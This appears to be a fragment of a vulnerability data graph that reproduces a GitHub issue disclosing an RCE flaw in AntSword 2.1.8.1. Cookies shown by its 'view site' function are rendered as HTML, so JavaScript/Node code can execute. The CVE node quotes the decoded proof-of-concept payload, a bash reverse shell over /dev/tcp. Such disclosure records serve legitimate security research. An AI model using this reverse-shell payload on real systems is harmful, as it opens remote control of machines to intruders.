    <node id="CVE-2020-25470">
      <data key="d0">CVE</data>
      <data key="d1">javascript</data>
      <data key="d2">RCE Vulnerability in View Site</data>
      <data key="d3">AntSword  Ver: 2.1.8.1

There is a view site function which will show cookies in UI.
![图片](https://user-images.githubusercontent.com/24632029/91374485-e0811000-e84a-11ea-96f3-b474248d85db.png)
![图片](https://user-images.githubusercontent.com/24632029/91374572-11614500-e84b-11ea-81f9-4287c014b559.png)
After few tests i got that it can parse html tags.
![图片](https://user-images.githubusercontent.com/24632029/91374723-6735ed00-e84b-11ea-9f98-1be39b42a013.png)
So it can also execute javascript/node codes like this.
![图片](https://user-images.githubusercontent.com/24632029/91374808-a19f8a00-e84b-11ea-8061-f97412057e58.png)
(i used base64 encoded command which decodes as```bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1```)

</data>
    </node>
    <node id="AntSwordProject/antSword#256">
      <data key="d0">Issue</data>
      <data key="d2">RCE Vulnerability in View Site</data>
      <data key="d3">AntSword  Ver: 2.1.8.1

There is a view site function which will show cookies in UI.
![图片](https://user-images.githubusercontent.com/24632029/91374485-e0811000-e84a-11ea-96f3-b474248d85db.png)
![图片](https://user-images.githubusercontent.com/24632029/91374572-11614500-e84b-11ea-81f9-4287c014b559.png)
After few tests i got that it can parse html tags.
![图片](https://user-images.githubusercontent.com/24632029/91374723-6735ed00-e84b-11ea-9f98-1be39b42a013.png)
So it can also execute javascript/node codes like this.
